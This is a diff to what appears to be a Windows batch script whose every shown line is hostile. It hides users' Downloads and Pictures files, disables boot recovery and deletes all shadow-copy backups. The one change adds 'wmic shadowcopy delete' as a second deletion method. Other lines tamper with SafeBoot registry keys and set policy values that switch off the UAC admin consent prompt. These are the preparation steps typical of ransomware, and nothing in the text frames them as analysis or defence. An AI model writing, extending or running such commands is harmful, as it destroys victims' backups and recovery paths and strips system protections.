@@ -29,7 +29,7 @@ attrib +h +s "%USERPROFILE%\Downloads\*" /s /d
 attrib +h +s "%USERPROFILE%\Pictures\*" /s /d
 bcdedit /set {default} recoveryenabled no
 vssadmin delete shadows /all /quiet >nul
-vssadmin delete shadows /all /quiet >nul
+wmic shadowcopy delete >nul 2>&1
 bcdedit /deletevalue {current} safeboot >nul 2>&1
 reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot" /v "OptionValue" /t REG_DWORD /d 1 /f
 reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal" /v "OptionValue" /t REG_DWORD /d 1 /f
@@ -98,3 +98,4 @@ reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "Ena
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "UndockWithoutLogon" /t REG_DWORD /d 1 /f
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "ScRemoveOption" /t REG_DWORD /d 1 /f
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d 0 /f
+
